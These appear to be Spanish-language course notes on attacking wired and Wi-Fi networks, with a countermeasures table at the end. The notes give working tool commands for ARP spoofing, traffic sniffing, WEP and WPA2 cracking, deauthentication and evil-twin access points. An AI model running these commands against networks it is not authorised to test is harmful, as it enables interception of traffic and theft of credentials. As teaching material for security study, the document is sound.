# 📡 Módulo 5: Explotación de Redes Cableadas e Inalámbricas

> **Fase:** Explotación de infraestructura | **Capa OSI:** 2 (Enlace) y 3 (Red) | **Impacto:** Interceptación, MitM, DoS

---

## 📌 ¿De qué trata este módulo?

Una vez dentro de la organización (física o lógicamente), el atacante apunta a la red. Este módulo cubre los ataques a **redes LAN cableadas** (switches, ARP, VLAN) y **redes Wi-Fi** (WEP, WPA/WPA2), técnicas de intercepción de tráfico y herramientas como Wireshark y Aircrack-ng.

---

## 🔌 PARTE 1: Redes Cableadas

### 1. Sniffing de Tráfico

Capturar paquetes que circulan por la red:

```bash
# Wireshark (GUI) - captura en interfaz eth0
wireshark

# tcpdump (terminal)
tcpdump -i eth0 -w captura.pcap
tcpdump -i eth0 'port 80'           # solo HTTP
tcpdump -i eth0 'host 192.168.1.1'  # filtrar por IP
```

**Lo que se puede capturar en texto plano:**
- Credenciales HTTP, FTP, Telnet
- Consultas DNS
- Cookies de sesión
- Emails sin cifrar (POP3, IMAP sin TLS)

---

### 2. ARP Spoofing / Envenenamiento ARP

El atacante falsifica respuestas ARP para posicionarse como intermediario (**Man-in-the-Middle**):

```
NORMAL:
Víctima → ¿Quién es 192.168.1.1? → Router responde: "Yo, MAC AA:BB:CC"

ARP SPOOFING:
Víctima → ¿Quién es 192.168.1.1? → Atacante responde PRIMERO: "Yo, MAC EE:FF:00"
→ Todo el tráfico de la víctima pasa por el atacante
```

```bash
# Con arpspoof (dsniff)
echo 1 > /proc/sys/net/ipv4/ip_forward  # habilitar IP forwarding
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1   # engañar a víctima
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50   # engañar al router

# Con Ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```

---

### 3. VLAN Hopping

Técnica para saltar entre VLANs que deberían estar aisladas:

```
Tipos:
├── Switch Spoofing   → el atacante negocia ser un trunk port
└── Double Tagging    → doble etiqueta 802.1Q para cruzar VLAN nativa
```

---

## 📶 PARTE 2: Redes Inalámbricas (Wi-Fi)

### Modos de operación de la tarjeta Wi-Fi

```bash
# Ver interfaces
iwconfig

# Poner tarjeta en modo monitor (capturar todo el tráfico)
airmon-ng start wlan0
# Crea interfaz: wlan0mon
```

---

### 1. Ataque a WEP (obsoleto pero aún presente)

WEP usa RC4 con IVs de 24 bits — **rompible en minutos**:

```bash
# 1. Poner en modo monitor
airmon-ng start wlan0

# 2. Identificar red WEP
airodump-ng wlan0mon

# 3. Capturar tráfico de la red objetivo
airodump-ng -c [canal] --bssid [MAC_AP] -w captura wlan0mon

# 4. Inyección de tráfico para acelerar captura de IVs
aireplay-ng -3 -b [MAC_AP] wlan0mon

# 5. Crackear cuando hay suficientes IVs (>50,000)
aircrack-ng captura*.cap
```

---

### 2. Ataque a WPA/WPA2 — Captura del Handshake

WPA2 es seguro si la contraseña es fuerte. El ataque es por **diccionario/fuerza bruta**:

```bash
# 1. Capturar handshake (esperar cliente o forzar deauth)
airodump-ng -c [canal] --bssid [MAC_AP] -w handshake wlan0mon

# 2. Forzar re-autenticación del cliente (deauth attack)
aireplay-ng -0 5 -a [MAC_AP] -c [MAC_Cliente] wlan0mon

# 3. Crackear con diccionario
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake*.cap

# 4. Con hashcat (GPU - mucho más rápido)
hashcat -m 2500 handshake.hccapx rockyou.txt
```

---

### 3. Evil Twin / Rogue AP

Crear un punto de acceso falso que imita al legítimo:

```bash
# Con hostapd-wpe (captura credenciales empresariales EAP)
hostapd-wpe rogue_ap.conf

# Con airbase-ng
airbase-ng -e "WiFi_Empresa" -c 6 wlan0mon
```

**Flujo del ataque:**
```
AP legítimo ←desautenticamos→ Clientes se desconectan
                                      ↓
                          AP falso (mismo SSID, señal más fuerte)
                                      ↓
                          Clientes se conectan al AP malicioso
                                      ↓
                          Atacante captura todo el tráfico
```

---

## 🛡️ Contramedidas

| Amenaza | Defensa |
|---------|---------|
| ARP Spoofing | Dynamic ARP Inspection (DAI) en switches |
| VLAN Hopping | Deshabilitar DTP, VLAN nativa en puerto no usado |
| Wi-Fi cracking | WPA3, contraseñas de +16 caracteres aleatorios |
| Evil Twin | Certificados 802.1X / WPA2-Enterprise |
| Sniffing | Cifrado TLS en todas las aplicaciones |

---

## 💡 Análisis Personal

> Este módulo dejó claro por qué las redes Wi-Fi públicas son tan peligrosas. Un atacante en el mismo café puede capturar credenciales con herramientas básicas en minutos. La transición a **WPA3** y el uso universal de **HTTPS/TLS** son las defensas más importantes.
>
> El concepto de Man-in-the-Middle me parece el más elegante desde el punto de vista técnico: sin explotar ningún bug de software, el atacante se vuelve invisible en el flujo de comunicación. La defensa requiere autenticación mutua y cifrado de extremo a extremo.

---

[← Módulo 4](./modulo4-ingenieria-social.md) | [Módulo 6 →](./modulo6-vulnerabilidades-aplicaciones.md)
